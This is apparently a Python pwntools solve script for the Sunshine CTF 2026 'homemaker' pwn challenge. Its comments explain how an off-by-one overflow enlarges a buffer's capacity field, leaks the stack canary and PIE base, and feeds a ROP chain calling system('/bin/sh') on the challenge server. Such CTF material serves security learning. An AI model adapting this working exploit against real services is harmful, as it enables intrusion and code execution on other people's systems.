#!/usr/bin/env python3
# Sunshine CTF 2026 - Pwn/homemaker
#
# Bug: sub_174C (opcode 2, "write card") bounds-checks  (u16)(len-1) > capacity,
# an off-by-one that permits len = capacity+1 bytes into a 256-byte stack buffer.
# The 257th byte lands exactly on the LOW BYTE OF THE CAPACITY FIELD itself
# (v8 @ buf+256), so one overflow enlarges the bound that governs it.
# sub_1810 (opcode 3, "read card") then dumps *capacity* bytes from the buffer,
# so the enlarged capacity turns the same field into a stack disclosure:
# canary @ buf+264, saved rbp @ buf+272, saved RIP @ buf+280 (-> PIE base).
# A second write with the grown capacity rewrites the frame past the canary.
# rdi points at "/bin/sh" sitting in the GLOBAL frame buffer (PIE+0x4865),
# so no stack address is needed.
import sys, re
from pwn import *

context.update(arch='amd64', log_level='info')
BIN   = '../homemaker'
HOST, PORT = 'sunshinectf.games', 26008

SOH, EOT = 0x1b5b, 0x1b5c
KEY      = bytes.fromhex('1337c35f')      # sub_1289: BE u32 == 322421599
POP_RDI  = 0x12aa
RET      = 0x12ab                          # the `ret` of `pop rdi ; ret`, for alignment
SYSTEM   = 0x10c0                          # system@plt stub
BINSH_G  = 0x4865                          # payload[1] inside the global frame buffer
RET_MAIN = 0x1a9f                          # insn after `call sub_1865` in main

def crc8(data):                             # sub_11E9: poly 0x2F, init 0, no reflect
    c = 0
    for b in data:
        c ^= b
        for _ in range(8):
            c = ((c << 1) ^ 0x2F) & 0xFF if c & 0x80 else (c << 1) & 0xFF
    return c

def frame(payload):
    return p16(SOH, endian='big') + p16(len(payload), endian='big') \
           + payload + p8(crc8(payload)) + p16(EOT, endian='big')

def force_crc(payload, pos, target):
    """CRC8 is affine over GF(2), so sweeping one byte hits every target exactly once."""
    p = bytearray(payload)
    for v in range(256):
        p[pos] = v
        if crc8(p) == target:
            return bytes(p)
    raise RuntimeError('unreachable: crc8 is a bijection in one byte')

def reply(io):
    io.recvuntil(p16(SOH, endian='big'))    # resync: the banner trails newlines
    n = u16(io.recvn(2), endian='big')
    return io.recvn(n + 3)[:n]              # [0]=status, [1:]=data

io = remote(HOST, PORT) if len(sys.argv) > 1 and sys.argv[1] == 'remote' else process(BIN)
io.recvuntil(b'SERVICE KEY CARD TO CONTINUE <<')


# 1 -- authenticate: opcode 1, len must be exactly 5. Sets capacity = 256.
io.send(frame(b'\x01' + KEY)); log.success('authenticated, capacity=256')
reply(io)

# 2 -- off-by-one: 257 bytes, last one overwrites capacity's low byte with 0xFF.
#      capacity 0x0100 -> 0x01FF = 511, enough to reach saved RIP at buf+280.
io.send(frame(force_crc(b'\x02' + b'A' * 256, 256, 0xFF)))
reply(io); log.success('capacity grown to 511 via 1-byte overflow')

# 3 -- disclosure: opcode 3 dumps `capacity` bytes, now reaching past the canary.
io.send(frame(b'\x03'))
dump   = reply(io)[1:]
canary = u64(dump[264:272])
rip    = u64(dump[280:288])
pie    = rip - RET_MAIN
log.success(f'canary   = {canary:#018x}')
log.success(f'saved RIP= {rip:#x}  ->  PIE base = {pie:#x}')
assert canary & 0xff == 0 and pie & 0xfff == 0, 'leak misaligned - check offsets'

# 4 -- rewrite the frame. "/bin/sh" travels in the payload, which lives in the
#      global frame buffer at a fixed PIE offset, so rdi needs no stack leak.
# buf spans [0,303]; the copy writes buf[0..302] from the payload and buf[303]
# from the CHECKSUM byte, so the chain's last byte must be forced via the CRC.
# We arrive at system() via `ret`, so rsp is 0 mod 16 where the ABI wants 8 mod
# 16 -- glibc's movaps would fault. One extra `ret` gadget restores alignment.
full = flat({264: canary, 272: 0xdeadbeef, 280: pie + POP_RDI,
             288: pie + BINSH_G, 296: pie + RET, 304: pie + SYSTEM},
            filler=b'C', length=312)
io.send(frame(force_crc(b'\x02' + full[:311], 100, full[311])))
reply(io); log.success('frame rewritten past the canary')

# 5 -- opcode 4 returns from the vulnerable function; the canary check passes.
#      This frame OVERWRITES the global frame buffer, so it must be the one
#      carrying "/bin/sh" at payload[1] == PIE+0x4865, which is where rdi points.
#      Opcode 4 ignores its payload, so the string rides along for free.
io.send(frame(b'\x04' + b'/bin/sh\x00'))
io.recvrepeat(0.5)
io.sendline(b'cat flag*.txt flag* 2>/dev/null; ls')
out = io.recvrepeat(2).decode('latin1')
print(out)
m = re.search(r'sun\{[^}]*\}', out)
if m:
    log.success(f'FLAG: {m.group(0)}')
else:
    io.interactive()
